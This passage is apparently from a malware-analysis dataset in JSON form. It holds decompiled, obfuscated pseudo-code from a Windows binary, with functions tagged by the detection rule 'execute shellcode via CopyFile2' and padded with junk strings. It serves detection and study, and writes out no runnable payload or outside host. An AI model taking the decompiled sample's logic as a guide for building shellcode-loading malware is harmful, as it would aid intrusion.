0x43378b;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    *piStack40 = *0x5423b0;\n    puVar4[1] = *0x5423b4;\n    puVar4[2] = *0x5423b8;\n    puVar4[3] = *0x5423bc;\n    *(puVar4 + 4) = 1;\n    puVar4[6] = 0x40430000;\n    puVar4[5] = 0;\n    *(puVar4 + 7) = 1;\n    *(puVar4 + 0xe) = 1;\n    puVar4[0xf] = 0x1df;\n    *(puVar4 + 0x10) = 0;\n    puVar16[-0x15] = 0x4337c2;\n    uVar7 = fcn.00404903();\n    puVar16 = puStack44;\n    puStack44[-1] = uVar7;\n    piStack40 = puVar16 + -0x16;\n    puVar16[-7] = 0;\n    puVar16[-3] = 0;\n    puVar16[-2] = 0xf;\n    *(puVar16 + -7) = 0;\n    *(puVar16 + -0x18) = uStack36;\n    puVar16[-0x17] = \"ozzugyowrxvtmtopbpbamex\";\n    puVar16[-0x19] = 0x17;\n    puVar16[-0x1a] = 0x433808;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    piStack40[5] = *0x5423d0;\n    piVar6[6] = *0x5423d4;\n    piVar6[7] = *0x5423d8;\n    piVar6[8] = *0x5423dc;\n    piVar6[1] = 0x656d7579;\n    piVar6[2] = 0x6b79646b;\n    piVar6[3] = 0x79616375;\n    *(piVar6 + 0xf) = 0x6c687179;\n    *(piVar6 + 0x13) = 0;\n    *piVar6 = &stack0xffffff90;\n    piVar6[9] = *0x5423f0;\n    piVar6[10] = *0x5423f4;\n    piVar6[0xb] = *0x5423f8;\n    piVar6[0xc] = *0x5423fc;\n    piVar6[0xd] = 0x40cbe500;\n    piVar6[0xe] = 0x2424;\n    *(piVar6 + 0x15) = 0;\n    puVar16[-0x1a] = 0x43385d;\n    fcn.004049f3();\n    puVar16 = puStack44;\n    uVar8 = uStack92;\n    if (0xf < uStack92) {\n        uVar8 = uStack92 + 1;\n        uVar9 = uStack112;\n        if (0xfff < uVar8) {\n            uVar9 = *(uStack112 - 4);\n            if (0x1f < (uStack112 - 4) - uVar9) goto code_r0x00433a6f;\n            uVar8 = uStack92 + 0x24;\n        }\n        puStack44[-1] = uVar8;\n        puVar16[-2] = uVar9;\n        puVar16[-3] = 0x433895;\n        uVar8 = fcn.00401a32(puVar16[-2]);\n    }\n    uStack96 = 0;\n    uStack92 = 0xf;\n    uStack112 = uStack112 & 0xffffff00;\n    puStack44 = puVar16;\n    puVar16[-1] = uVar8;\n    piStack40 = puVar16 + -0x17;\n    puStack48 = puVar16 + -8;\n    puVar16[-8] = 0;\n    puVar16[-4] = 0;\n    puVar16[-3] = 0xf;\n    *(puVar16 + -8) = 0;\n    *(puVar16 + -0x19) = uStack36;\n    puVar16[-0x18] = \"xknkuewqgtvpgobbtzietqyzt\";\n    puVar16[-0x1a] = 0x19;\n    puVar16[-0x1b] = 0x4338f3;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    piStack40[2] = 0;\n    piVar6[6] = 0;\n    piVar6[7] = 0xf;\n    *(piVar6 + 2) = 0;\n    uStack20 = 7;\n    *(puVar16 + -0x1c) = uStack36;\n    puVar16[-0x1b] = \"odvmigcqoihaljsxgkmunflueionmlionuqvsu\";\n    puVar16[-0x1d] = 0x26;\n    puVar16[-0x1e] = 0x433939;\n    fcn.00402f72();\n    piVar6 = piStack40;\n    *piStack40 = &stack0xffffffa8;\n    *(piVar6 + 1) = 0;\n    *(piVar6 + 8) = 0;\n    piVar6[9] = *0x542410;\n    piVar6[10] = *0x542414;\n    piVar6[0xb] = *0x542418;\n    piVar6[0xc] = *0x54241c;\n    piVar6[0xe] = 0x409dac00;\n    piVar6[0xd] = 0;\n    *(piVar6 + 0x15) = 1;\n    *(piVar6 + 0x16) = 0;\n    uStack20 = 6;\n    puVar16[-0x1e] = 0x433976;\n    fcn.00401c67();\n    puVar4 = puStack44;\n    uVar8 = uStack68;\n    if (0xf < uStack68) {\n        uVar8 = uStack68 + 1;\n        uVar9 = uStack88;\n        if (0xfff < uVar8) {\n            uVar9 = *(uStack88 - 4);\n            puVar16 = puStack44;\n            if (0x1f < (uStack88 - 4) - uVar9) goto code_r0x00433a7b;\n            uVar8 = uStack68 + 0x24;\n        }\n        puStack44[-1] = uVar8;\n        puVar4[-2] = uVar9;\n        puVar4[-3] = 0x4339ae;\n        uVar8 = fcn.00401a32(puVar4[-2]);\n    }\n    uStack72 = 0;\n    uStack68 = 0xf;\n    uStack88 = uStack88 & 0xffffff00;\n    puVar4[-1] = uVar8;\n    piStack40 = puVar4 + -6;\n    puVar4[-6] = 0;\n    puVar4[-2] = 0;\n    puVar4[-1] = 0xf;\n    *(puVar4 + -6) = 0;\n    puVar16 = puVar4 + -9;\n    *(puVar4 + -8) = uStack36;\n    puVar4[-7] = \"ofsqvbhgruvplgeccdbethyvpgvmqjlsuvmol\";\n    puVar4[-9] = 0x25;\n    puVar4[-10] = 0x433a01;\n    fcn.00402f72();\n    uVar8 = piStack40[5];\n    if (0xf < uVar8) {\n        iVar10 = *piStack40;\n        uVar9 = uVar8 + 1;\n        iVar11 = iVar10;\n        if (0xfff < uVar9) {\n            iVar11 = *(iVar10 + -4);\n            if (0x1f < (iVar10 + -4) - iVar11) goto code_r0x00433a87;\n            uVar9 = uVar8 + 0x24;\n        }\n        puVar4[-10] = uVar9;\n        puVar4[-0xb] = iVar11;\n        puVar4[-0xc] = 0x433a34;\n        fcn.00401a32(puVar4[-0xb]);\n    }\n    *in_FS_OFFSET = iStack28;\n    return iStack64;\n}\n",
        "token_count": 8842
    },
    "00435ea0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __fastcall fcn.00435ea0(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    uint *puVar16;\n    uint *puVar17;\n    int32_t *in_FS_OFFSET;\n    uint32_t auStack104 [4];\n    uint uStack88;\n    uint32_t uStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack40 = &stack0xffffff98;\n    puStack32 = &stack0xffffff98;\n    uStack24 = 0x44c790;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iStack76 = param_1 + 0x14;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x24) = 0;\n    *(param_1 + 0x28) = 0xf;\n    *(param_1 + 0x14) = 0;\n    iStack72 = param_1 + 0x34;\n    *(param_1 + 0x34) = 0;\n    *(param_1 + 0x44) = 0;\n    *(param_1 + 0x48) = 0xf;\n    *(param_1 + 0x34) = 0;\n    iStack68 = param_1 + 0x4c;\n    *(param_1 + 0x4c) = 0;\n    *(param_1 + 0x5c) = 0;\n    *(param_1 + 0x60) = 0xf;\n    *(param_1 + 0x4c) = 0;\n    *(param_1 + 0x74) = 0;\n    *(param_1 + 0x84) = 0;\n    *(param_1 + 0x88) = 0xf;\n    *(param_1 + 0x74) = 0;\n    iStack64 = param_1 + 0x74;\n    uStack20 = 2;\n    iStack80 = param_1;\n    uVar6 = fcn.00403b48(*0x542460, *0x542464, *0x542468, *0x54246c, *0x542480, *0x542484, *0x542488, *0x54248c, 0x1122\n                         , 0x6d68);\n    puVar4 = puStack40;\n    puStack44 = puStack40;\n    puStack40[-1] = uVar6;\n    puStack48 = puStack40 + -6;\n    puStack40[-6] = 0;\n    puStack40[-2] = 0;\n    puStack40[-1] = 0xf;\n    puVar1 = puStack40 + -6;\n    puStack40 = puStack40 + -0x1a;\n    *puVar1 = 0;\n    *(puVar4 + -0x1c) = uStack36;\n    puVar4[-0x1b] = \"zpcmtytfnyqappnnxrljgcxnrereburyeubacmqrtcyuovnfbudilvunhmpkhqgyqlmci\";\n    puVar4[-0x1d] = 0x45;\n    puVar4[-0x1e] = 0x435ffd;\n    fcn.00402f72();\n    puVar5 = puStack40;\n    puStack52 = puStack40 + 0x34;\n    *(puStack40 + 0x34) = 0;\n    *(puVar5 + 0x44) = 0;\n    *(puVar5 + 0x48) = 0xf;\n    puVar5[0x34] = 0;\n    uStack20 = 0xf;\n    *(puVar4 + -0x1f) = uStack36;\n    puVar4[-0x1e] = \"ffubtmahxgfifsryxcenqaidwkktoavlymikaknpsqmsvvtqyfyacjjhq\";\n    puVar4[-0x20] = 0x39;\n    puVar4[-0x21] = 0x436044;\n    fcn.00402f72();\n    puVar5 = puStack40;\n    puStack56 = puStack40 + 0x1c;\n    *(puStack40 + 0x1c) = 0;\n    *(puVar5 + 0x2c) = 0;\n    *(puVar5 + 0x30) = 0xf;\n    puVar5[0x1c] = 0;\n    uStack20 = 0x10;\n    *(puVar4 + -0x22) = uStack36;\n    puVar4[-0x21] = \"nmbxbigkgvwgsjndjnftzleszdkvnavvyjcdkkkicmbizetubbsgvzugaxwmghhdtevcakgxmmghmtmjlrj\";\n    puVar4[-0x23] = 0x53;\n    puVar4[-0x24] = 0x43608b;\n    fcn.00402f72();\n    puVar5 = puStack40;\n    *(puStack40 + 4) = 0;\n    *(puVar5 + 0x14) = 0;\n    *(puVar5 + 0x18) = 0xf;\n    puVar5[4] = 0;\n    uStack20 = 0x11;\n    *(puVar4 + -0x25) = uStack36;\n    puVar4[-0x24] = \"kldzltqhzpjrkfhrrjouexdwsvpclistgaxpybfcwxwduax\";\n    puVar4[-0x26] = 0x2f;\n    puVar4[-0x27] = 0x4360d1;\n    fcn.00402f72();\n    puVar5 = puStack40;\n    *puStack40 = 0;\n    *(puVar5 + 0x4c) = 0x248;\n    puVar4[-0x27] = 0x4360e3;\n    fcn.0040527c();\n    puVar1 = puStack44;\n    uStack20 = 2;\n    puVar11 = puStack44 + -1;\n    puStack44[-1] = 0x50;\n    puVar1[-2] = 0x4360f4;\n    uVar6 = fcn.004024b9(*puVar11, *puVar1);\n    puVar1[-1] = 0x50;\n    puVar1[-2] = uVar6;\n    puVar1[-3] = 0x4360ff;\n    fcn.00401a32(puVar1[-2]);\n    puStack40 = puVar1 + -0x13;\n    puStack48 = puVar1 + -9;\n    puStack44 = puVar1;\n    puVar1[-9] = 0;\n    puVar1[-5] = 0;\n    puVar1[-4] = 0xf;\n    *(puVar1 + -9) = 0;\n    *(puVar1 + -0x15) = uStack36;\n    puVar1[-0x14] = \"ebipislojrlvhudnphllguoslzrpxwqyaizwzzvtvhjmofzmhvfrqkhotrdibqedbqxsmhwqdeksxcsuu\";\n    puVar1[-0x16] = 0x51;\n    puVar1[-0x17] = 0x43614a;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    *puStack40 = 0;\n    puVar4[4] = 0;\n    puVar4[5] = 0xf;\n    *puVar4 = 0;\n    uStack20 = 0xe;\n    *(puVar1 + -0x18) = uStack36;\n    puVar1[-0x17] = \"icqozugnxxocurcbmheownndakxolfkevpkxtjqpigfkdocywntlkwktdhn\";\n    puVar1[-0x19] = 0x3b;\n    puVar1[-0x1a] = 0x436189;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack40[6] = 0x425;\n    *(puVar4 + 7) = 1;\n    *(puVar4 + 8) = 0;\n    *(puVar4 + 9) = 1;\n    puVar4[0x11] = 0x40c41980;\n    puVar4[0x10] = 0;\n    puVar4[0x12] = 0x1eca;\n    uStack20 = 2;\n    puVar1[-0x1a] = 0x4361c0;\n    uVar6 = fcn.004064fb();\n    puVar1 = puStack44;\n    puStack44[-1] = uVar6;\n    puStack40 = puVar1 + -0x22;\n    puStack48 = puVar1 + -0xe;\n    puVar1[-0xe] = 0;\n    puVar1[-10] = 0;\n    puVar1[-9] = 0xf;\n    *(puVar1 + -0xe) = 0;\n    *(puVar1 + -0x24) = uStack36;\n    puVar1[-0x23] = \"jiaohycddottizoibcptppwbj\";\n    puVar1[-0x25] = 0x19;\n    puVar1[-0x26] = 0x43620e;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack52 = puStack40 + 0xe;\n    puStack40[0xe] = 0;\n    puVar4[0x12] = 0;\n    puVar4[0x13] = 0xf;\n    *(puVar4 + 0xe) = 0;\n    uStack20 = 0xb;\n    *(puVar1 + -0x27) = uStack36;\n    puVar1[-0x26] = \"balwfyguwblwtagdjotlhfnqdkhiiehlrxjcbrvlquvoddchnbqgezgguztmxuqrwwmh\";\n    puVar1[-0x28] = 0x44;\n    puVar1[-0x29] = 0x436255;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack56 = puStack40 + 6;\n    puStack40[6] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0xf;\n    *(puVar4 + 6) = 0;\n    uStack20 = 0xc;\n    *(puVar1 + -0x2a) = uStack36;\n    puVar1[-0x29] = \"biukcoxnawherxcphkprcrsteojedxtkyorvacsscnootyqnezggglxgowqlwyxjpm\";\n    puVar1[-0x2b] = 0x42;\n    puVar1[-0x2c] = 0x43629e;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    *puStack40 = 0;\n    puVar4[4] = 0;\n    puVar4[5] = 0xf;\n    *puVar4 = 0;\n    uStack20 = 0xd;\n    *(puVar1 + -0x2d) = uStack36;\n    puVar1[-0x2c] = \"xfyzdcmsitjyqwvazplahughwvrtkrsibsvubngoftkzzodgipunyfljyuiiviideguifhrmdqwotaylmeqxiqtffo\";\n    puVar1[-0x2e] = 0x5a;\n    puVar1[-0x2f] = 0x4362dd;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack40[0xd] = 0x40df5600;\n    puVar4[0xc] = 0;\n    uVar3 = *0x5424cc;\n    uVar2 = *0x5424c8;\n    uVar6 = *0x5424c4;\n    puVar4[0x1a] = *0x5424c0;\n    puVar4[0x1b] = uVar6;\n    puVar4[0x1c] = uVar2;\n    puVar4[0x1d] = uVar3;\n    puVar4[0x1e] = 0x6a2;\n    puVar4[0x20] = 0x40c17100;\n    puVar4[0x1f] = 0;\n    *(puVar4 + 0x21) = 1;\n    uStack20 = 2;\n    puVar1[-0x2f] = 0x436324;\n    fcn.00402f8b();\n    puVar1 = puStack44;\n    puVar12 = puStack44 + -1;\n    puStack44[-1] = 0x20;\n    puVar1[-2] = 0x43632e;\n    uVar6 = fcn.004024b9(*puVar12, *puVar1);\n    puVar1[-1] = 0x20;\n    puVar1[-2] = uVar6;\n    puVar1[-3] = 0x436339;\n    fcn.00401a32(puVar1[-2]);\n    puVar1[-7] = 0;\n    puVar17 = puVar1 + -8;\n    puVar1[-8] = &stack0xffffff98;\n    puVar1[-9] = 0x436347;\n    fcn.00403ea9();\n    uVar7 = uStack84;\n    if (0xf < uStack84) {\n        uVar7 = uStack84 + 1;\n        uVar8 = auStack104[0];\n        if (0xfff < uVar7) {\n            uVar8 = *(auStack104[0] - 4);\n            if (0x1f < (auStack104[0] - 4) - uVar8) {\n                uStack20 = 0;\n                puVar1[-9] = 0x436a0d;\n                fcn.004047f5();\n                goto code_r0x00436a0d;\n            }\n            uVar7 = uStack84 + 0x24;\n        }\n        puVar1[-9] = uVar7;\n        puVar1[-10] = uVar8;\n        puVar1[-0xb] = 0x43637c;\n        uVar7 = fcn.00401a32(puVar1[-10]);\n    }\n    uStack88 = 0;\n    uStack84 = 0xf;\n    auStack104[0] = auStack104[0] & 0xffffff00;\n    puStack44 = puVar1 + -8;\n    puVar1[-9] = uVar7;\n    puStack40 = puVar1 + -0x22;\n    puStack48 = puVar1 + -0x12;\n    puVar1[-0x12] = 0;\n    puVar1[-0xe] = 0;\n    puVar1[-0xd] = 0xf;\n    *(puVar1 + -0x12) = 0;\n    *(puVar1 + -0x24) = uStack36;\n    puVar1[-0x23] = \"ggpjpniosgidwngfllgkxekpawjulrfqlyeuaeeipggklweeqjwqc\";\n    puVar1[-0x25] = 0x35;\n    puVar1[-0x26] = 0x4363da;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack52 = puStack40 + 6;\n    puStack40[6] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0xf;\n    *(puVar4 + 6) = 0;\n    uStack20 = 9;\n    *(puVar1 + -0x27) = uStack36;\n    puVar1[-0x26] = \"mtjfdgzofrhmjbgvaehfevxwdmnsfbvlwggssdntgqsyxzjefdltpkrybfeisnx\";\n    puVar1[-0x28] = 0x3f;\n    puVar1[-0x29] = 0x436423;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    *puStack40 = 0;\n    puVar4[4] = 0;\n    puVar4[5] = 0xf;\n    *puVar4 = 0;\n    uStack20 = 10;\n    *(puVar1 + -0x2a) = uStack36;\n    puVar1[-0x29] = \"ithzdzlhltxtmvpaigwypbsncbzpzwpvtryfuvmyhkuuznyrlxzmtvbz\";\n    puVar1[-0x2b] = 0x38;\n    puVar1[-0x2c] = 0x436462;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    *(puStack40 + 0xc) = 1;\n    puVar4[0xe] = 0x40c6e380;\n    puVar4[0xd] = 0;\n    *(puVar4 + 0xf) = 1;\n    puVar4[0x16] = 0x5d6;\n    puVar4[0x17] = 0x49b;\n    puVar4[0x18] = 0x2aa;\n    *(puVar4 + 0x19) = 1;\n    puVar1[-0x2c] = 0x436499;\n    uVar6 = fcn.0040459d();\n    puVar4 = puStack44;\n    puStack40 = puStack44;\n    puStack44[-1] = uVar6;\n    puStack44[-6] = 0;\n    puStack44[-2] = 0;\n    puStack44[-1] = 0xf;\n    puVar1 = puStack44 + -6;\n    puStack44 = puStack44 + -0xc;\n    *puVar1 = 0;\n    uStack20 = 2;\n    *(puVar4 + -0xe) = uStack36;\n    puVar4[-0xd] = \"kndyminzmqccyshsiepwcfcyjaqvlqjnxdcxbzrorwdhwgcaehkewyxowhhqtpgsrvdxdkoorouxzcqcrczbg\";\n    puVar4[-0xf] = 0x55;\n    puVar4[-0x10] = 0x4364e9;\n    fcn.00402f72();\n    puVar1 = puStack44;\n    puStack44[5] = 0xf;\n    puVar1[4] = 0xd;\n    *puVar1 = 0x67636965;\n    puVar1[1] = 0x66627162;\n    puVar1[2] = 0x78646a6f;\n    *(puVar1 + 3) = 0x62;\n    puVar4[-0x10] = 0x436519;\n    uVar6 = fcn.00401960();\n    puVar4 = puStack40;\n    puStack44 = puStack40;\n    puStack40[-1] = uVar6;\n    puStack40[-6] = 0;\n    puStack40[-2] = 0;\n    puStack40[-1] = 0xf;\n    puVar1 = puStack40 + -6;\n    puStack40 = puStack40 + -0x10;\n    *puVar1 = 0;\n    *(puVar4 + -0x12) = uStack36;\n    puVar4[-0x11] = \"gzmzhhgvdnuarnrodeuqtmuzbazmilecfbvcfk\";\n    puVar4[-0x13] = 0x26;\n    puVar4[-0x14] = 0x436564;\n    fcn.00402f72();\n    puVar1 = puStack40;\n    puStack40[1] = 0x40d20580;\n    *puVar1 = 0;\n    *(puVar1 + 2) = 1;\n    uVar3 = *0x5424ec;\n    uVar2 = *0x5424e8;\n    uVar6 = *0x5424e4;\n    puVar1[3] = *0x5424e0;\n    puVar1[4] = uVar6;\n    puVar1[5] = uVar2;\n    puVar1[6] = uVar3;\n    *(puVar1 + 7) = 1;\n    puVar1[8] = 0xe82;\n    *(puVar1 + 9) = 1;\n    puVar4[-0x14] = 0x436597;\n    uVar6 = fcn.004035da();\n    puVar1 = puStack44;\n    puVar13 = puStack44 + -1;\n    puStack44[-1] = uVar6;\n    puStack40 = puVar1 + -0x22;\n    puStack48 = puVar1 + -6;\n    *puVar13 = 0xf;\n    puVar1[-2] = 0xd;\n    puVar1[-4] = 0x73736a79;\n    *(puVar1 + -3) = 0x6f;\n    puStack52 = puVar1 + -0xc;\n    puVar1[-0xc] = 0;\n    uVar3 = str.nkppfomu._4_4_;\n    uVar2 = str.nkppfomu._0_4_;\n    uVar6 = *0x542504;\n    puVar1[-8] = *0x542500;\n    puVar1[-7] = uVar6;\n    puVar1[-6] = uVar2;\n    puVar1[-5] = uVar3;\n    *(puVar1 + -0xc) = 0;\n    uStack20 = 6;\n    *(puVar1 + -0x24) = uStack36;\n    puVar1[-0x23] = \"kajzdcyquycoavewgopmrkjktjfhfpnypbcm\";\n    puVar1[-0x25] = 0x24;\n    puVar1[-0x26] = 0x436610;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack56 = puStack40 + 0xf;\n    puStack40[0xf] = 0;\n    puVar4[0x13] = 0;\n    puVar4[0x14] = 0xf;\n    *(puVar4 + 0xf) = 0;\n    uStack20 = 7;\n    *(puVar1 + -0x27) = uStack36;\n    puVar1[-0x26] = \"tvnxkztvfahnbzkrrnphxctgbsvuevnfccwzyqukvdrqvjdrrxlskrjuwvqppgstacxzwqxiceodysmaf\";\n    puVar1[-0x28] = 0x51;\n    puVar1[-0x29] = 0x436657;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack60 = puStack40 + 8;\n    puStack40[0xd] = 0xf;\n    puVar4[0xc] = 6;\n    puVar4[8] = 0x6f786365;\n    *(puVar4 + 9) = 0x6f6f;\n    *(puVar4 + 0x26) = 0;\n    puVar4[1] = 0;\n    puVar4[5] = 0;\n    puVar4[6] = 0xf;\n    *(puVar4 + 1) = 0;\n    uStack20 = 8;\n    *(puVar1 + -0x2a) = uStack36;\n    puVar1[-0x29] = \"sjqlrlrmjrsdjeazphaabiulzlpwtmwogcjsenhoavsw\";\n    puVar1[-0x2b] = 0x2c;\n    puVar1[-0x2c] = 0x4366c2;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    *puStack40 = 0xe01;\n    puVar4[7] = 0x1a0f;\n    puVar4[0xe] = 0x357;\n    puVar4[0x15] = 0x60b;\n    uStack20 = 2;\n    puVar1[-0x2c] = 0x4366ec;\n    uVar6 = fcn.0040503d();\n    puVar1 = puStack44;\n    puStack44[-1] = uVar6;\n    puStack40 = puVar1 + -0x10;\n    puVar1[-7] = 0;\n    puVar1[-3] = 0;\n    puVar1[-2] = 0xf;\n    *(puVar1 + -7) = 0;\n    *(puVar1 + -0x12) = uStack36;\n    puVar1[-0x11] = \"qguliyyoydqpnqryxtaztnrvczlsenkmasiwbgruhkcdqnelzicmbgiejbcqxyjsonxispzfeagauzpibhfyuewwnzqv\";\n    puVar1[-0x13] = 0x5c;\n    puVar1[-0x14] = 0x436732;\n    fcn.00402f72();\n    puVar5 = puStack40;\n    *(puStack40 + 0x20) = 0xf;\n    *(puVar5 + 0x1c) = 0xd;\n    *(puVar5 + 0xc) = 0x666d7671;\n    *(puVar5 + 0x10) = 0x6764616c;\n    *(puVar5 + 0x14) = 0x79656875;\n    *(puVar5 + 0x18) = 0x62;\n    *puVar5 = 0;\n    puVar5[4] = 1;\n    puVar5[8] = 1;\n    puVar5[0x3c] = 1;\n    puVar1[-0x14] = 0x436772;\n    uVar6 = fcn.00402072();\n    puVar1 = puStack44;\n    puVar14 = puStack44 + -1;\n    puStack44[-1] = uVar6;\n    puStack40 = puVar1 + -0x1c;\n    puStack48 = puVar1 + -6;\n    puVar1[-6] = 0;\n    puVar1[-2] = 0;\n    *puVar14 = 0xf;\n    *(puVar1 + -6) = 0;\n    *(puVar1 + -0x1e) = uStack36;\n    puVar1[-0x1d] = \"yrjksrywsizdlwlvwpogqxamdzyzuyuioghuqtjykqvqydifanbqk\";\n    puVar1[-0x1f] = 0x35;\n    puVar1[-0x20] = 0x4367bb;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack52 = puStack40 + 0x10;\n    puStack40[0x15] = 0xf;\n    puVar4[0x14] = 3;\n    puVar4[0x10] = 0x72746a;\n    puStack56 = puVar4 + 6;\n    puVar4[6] = 0;\n    puVar4[10] = 0;\n    puVar4[0xb] = 0xf;\n    *(puVar4 + 6) = 0;\n    uStack20 = 4;\n    *(puVar1 + -0x21) = uStack36;\n    puVar1[-0x20] = \"xjndeexwjsuafidedczbaywanmjwezlfyh\";\n    puVar1[-0x22] = 0x22;\n    puVar1[-0x23] = 0x43681f;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    *puStack40 = 0;\n    puVar4[4] = 0;\n    puVar4[5] = 0xf;\n    *puVar4 = 0;\n    uStack20 = 5;\n    *(puVar1 + -0x24) = uStack36;\n    puVar1[-0x23] = \"dwyosuifmmvasqktvphwkwparznaolwiwxdwoyxeyogy\";\n    puVar1[-0x25] = 0x2c;\n    puVar1[-0x26] = 0x43685e;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack40[0xd] = 0x40bbf000;\n    puVar4[0xc] = 0;\n    *(puVar4 + 0xe) = 0;\n    *(puVar4 + 0xf) = 0;\n    uStack20 = 2;\n    puVar1[-0x26] = 0x436883;\n    uVar6 = fcn.00401a37();\n    puVar1 = puStack44;\n    puVar15 = puStack44 + -1;\n    puStack44[-1] = uVar6;\n    puStack40 = puVar1 + -0x14;\n    puStack48 = puVar1 + -6;\n    puVar1[-6] = 0;\n    puVar1[-2] = 0;\n    *puVar15 = 0xf;\n    *(puVar1 + -6) = 0;\n    *(puVar1 + -0x16) = uStack36;\n    puVar1[-0x15] = \"reawuxwjuyjzfteuejfhmpvjorursvfzymaljjmxnsloqern\";\n    puVar1[-0x17] = 0x30;\n    puVar1[-0x18] = 0x4368cc;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    puStack40[4] = 0;\n    puVar4[8] = 0;\n    puVar4[9] = 0xf;\n    *(puVar4 + 4) = 0;\n    uStack20 = 3;\n    *(puVar1 + -0x19) = uStack36;\n    puVar1[-0x18] = \"gqodfhhzztsdudoapyqmaexqtnlgictwuqkllhpmnepsog\";\n    puVar1[-0x1a] = 0x2e;\n    puVar1[-0x1b] = 0x436912;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    uVar3 = *0x54252c;\n    uVar2 = *0x542528;\n    uVar6 = *0x542524;\n    *puStack40 = *0x542520;\n    puVar4[1] = uVar6;\n    puVar4[2] = uVar2;\n    puVar4[3] = uVar3;\n    uVar3 = *0x54254c;\n    uVar2 = *0x542548;\n    uVar6 = *0x542544;\n    puVar4[10] = *0x542540;\n    puVar4[0xb] = uVar6;\n    puVar4[0xc] = uVar2;\n    puVar4[0xd] = uVar3;\n    puVar1[-0x1b] = 0x43692f;\n    fcn.00404c5f();\n    puVar1 = puStack44;\n    uStack20 = 2;\n    puVar16 = puStack44 + -4;\n    puStack44[-1] = 0;\n    *puVar16 = 0;\n    puVar1[-5] = 0x436950;\n    uVar6 = fcn.00402ef5();\n    puVar1[-5] = uVar6;\n    puStack40 = puVar1 + -0x12;\n    puVar1[-0xe] = 0;\n    puVar1[-10] = 0;\n    puVar1[-9] = 0xf;\n    *(puVar1 + -0xe) = 0;\n    puVar17 = puVar1 + -0x15;\n    *(puVar1 + -0x14) = uStack36;\n    puVar1[-0x13] = \"vjwpmpbsqdzrastzbjo\";\n    puVar1[-0x15] = 0x13;\n    puVar1[-0x16] = 0x436993;\n    fcn.00402f72();\n    puVar4 = puStack40;\n    uVar3 = *0x54256c;\n    uVar2 = *0x542568;\n    uVar6 = *0x542564;\n    *puStack40 = *0x542560;\n    puVar4[1] = uVar6;\n    puVar4[2] = uVar2;\n    puVar4[3] = uVar3;\n    *(puVar4 + 10) = 0;\n    puVar4[0xb] = 0x1dd9;\n    puVar4[0xd] = 0x40ae5a00;\n    puVar4[0xc] = 0;\n    uVar7 = puVar4[9];\n    if (0xf < uVar7) {\n        iVar9 = puVar4[4];\n        uVar8 = uVar7 + 1;\n        iVar10 = iVar9;\n        if (0xfff < uVar8) {\n            iVar10 = *(iVar9 + -4);\n            if (0x1f < (iVar9 + -4) - iVar10) {\ncode_r0x00436a0d:\n                uStack20 = 1;\n                *(puVar17 + -4) = 0x436a19;\n                fcn.004047f5();\n                *(puVar17 + -4) = &stack0xfffffffc;\n                *(puVar17 + -0x90) = 0x436a2f;\n                fcn.004052d1();\n                *(puVar17 + -0x90) = &stack0x00000008;\n                *(puVar17 + -0x11c) = 0x436a3f;\n                fcn.004052d1();\n                *(puVar17 + -0x11c) = &stack0x00000014;\n                *(puVar17 + -0x1a8) = 0x436a52;\n                iVar9 = fcn.00403a76();\n                return iVar9;\n            }\n            uVar8 = uVar7 + 0x24;\n        }\n        puVar1[-0x16] = uVar8;\n        puVar1[-0x17] = iVar10;\n        puVar1[-0x18] = 0x4369ea;\n        fcn.00401a32(puVar1[-0x17]);\n    }\n    *in_FS_OFFSET = iStack28;\n    return iStack80;\n}\n",
        "token_count": 8411
    },
    "0043f620": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
